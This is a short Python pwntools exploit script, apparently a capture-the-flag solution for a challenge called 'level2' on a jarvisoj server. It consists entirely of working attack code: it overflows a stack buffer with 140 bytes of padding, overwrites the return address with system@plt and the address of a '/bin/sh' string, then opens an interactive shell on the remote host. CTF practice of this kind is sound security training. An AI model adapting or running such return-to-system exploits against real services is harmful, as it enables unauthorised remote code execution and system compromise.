from pwn import *

p = remote("pwn2.jarvisoj.com", 9878)
elf = ELF('./level2')
bin_sh_addr = 0x804a024
sys_plt = elf.plt['system']

print hex(sys_plt)

payload = 'A'* 140 + p32(sys_plt) + 'JUNK' + p32(bin_sh_addr)

p.send(payload)
p.interactive()
